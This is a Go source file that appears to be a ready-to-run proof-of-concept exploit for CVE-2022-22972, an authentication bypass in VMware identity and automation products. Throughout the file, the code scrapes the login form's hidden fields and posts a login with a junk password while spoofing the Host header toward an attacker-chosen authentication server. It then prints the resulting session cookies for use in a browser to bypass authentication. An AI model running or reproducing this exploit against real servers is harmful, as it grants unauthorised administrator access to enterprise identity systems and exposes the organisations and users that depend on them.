package main

import (
	"context"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"time"
)

const banner = `
                    _                                   _              
| |/|,/    _  __   /_/  _/_/_ _  _ _/_._  _ _/_._  _   /_)   _  _   _ _
|//  /|/|//_|//_' / //_// / //_'/ // //_ /_|/ //_// / /_)/_//_//_|_\_\ 
                                                      _//           
CVE-2022-22972    Author#Dghpi9
`

var URL, USER, HOST string

func Poc(domain, user, host string) {
	fmt.Println(banner)
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return net.DialTimeout(network, addr, 4*time.Second)
			},
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			TLSHandshakeTimeout:   10 * time.Second,
			ResponseHeaderTimeout: 10 * time.Second,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) > 15 {
				return errors.New("redirect too times")
			}
			return nil
		},
		Jar:     jar,
		Timeout: time.Second * 20,
	}
	request, _ := http.NewRequest(http.MethodGet, domain+"/vcac/", nil)
	response, err := client.Do(request)
	if err != nil {
		fmt.Printf("request failed ,err:%v\n", err)
		return
	}
	defer response.Body.Close()
	url1 := response.Request.URL.Scheme + "://" + response.Request.URL.Host + "/"
	newRequest, _ := http.NewRequest(http.MethodGet, domain+"/vcac/", nil)
	params := make(url.Values)
	params.Add("original_uri", url1+"vcac")
	newRequest.URL.RawQuery = params.Encode()
	do, err := client.Do(newRequest)
	if err != nil {
		fmt.Printf("request failed ,err:%v\n", err)
		return
	}
	docDetail, err := goquery.NewDocumentFromReader(do.Body)
	if err != nil {
		fmt.Printf("%v\n", err)
		return
	}
	protected_state, _ := docDetail.Find("#protected_state").Attr("value")
	userstore, _ := docDetail.Find("#userstore").Attr("value")
	userstoreDisplay, _ := docDetail.Find("#userstoreDisplay").Attr("value")
	horizonRelayState, _ := docDetail.Find("#loginForm > div.fields > input[type=hidden]:nth-child(8)").Attr("value")
	stickyConnectorId, _ := docDetail.Find("#loginForm > div.fields > input[type=hidden]:nth-child(9)").Attr("value")
	body := "protected_state=" + protected_state + "&userstore=" + userstore + "&username=" + user + "&password=fuckvm&userstoreDisplay=" + userstoreDisplay + "&horizonRelayState=" + horizonRelayState + "&stickyConnectorId=" + stickyConnectorId + "&action=Sign+in"
	r, _ := http.NewRequest(http.MethodPost, domain+"/SAAS/auth/login/embeddedauthbroker/callback", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Set("Connection", "close")
	r.Header.Set("Cache-Control", "max-age=0")
	r.Header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"")
	r.Header.Set("sec-ch-ua-mobile", "?0")
	r.Header.Set("sec-ch-ua-platform", "\"Windows\"")
	r.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:57.0) Gecko/20100101 Firefox/57.0")
	r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	r.Header.Set("Sec-Fetch-Site", "same-origin")
	r.Header.Set("Sec-Fetch-Mode", "navigate")
	r.Header.Set("Sec-Fetch-User", "?1")
	r.Header.Set("Sec-Fetch-Dest", "document")
	r.Header.Set("Accept-Encoding", "gzip, deflate")
	r.Header.Set("Referer", do.Request.URL.String())
	r.Header.Set("Upgrade-Insecure-Requests", "1")
	r.Header.Set("Origin", domain)
	r.Host = host
	r2, err := client.Do(r)
	if err != nil {
		fmt.Printf("request failed ,err:%v\n", err)
		return
	}
	defer do.Body.Close()
	fmt.Println("-------------------------------------------------")
	fmt.Println(domain)
	fmt.Printf("Cookies:\n%v\n\nSet cookie in your browser to bypass authentication", r2.Request.Cookies())
	defer r2.Body.Close()
}

func main() {
	flag.StringVar(&URL, "url", "", "Vul url,-url https://xxx.com")
	flag.StringVar(&USER, "user", "administrator", "username")
	flag.StringVar(&HOST, "host", "", "Auth Servers,(bugs365.com)")
	flag.Parse()
	if URL == "" && HOST == "" {
		fmt.Println(banner, "-help")
		os.Exit(0)
	}
	if URL != "" && HOST != "" {
		Poc(URL, USER, HOST)
	}
}
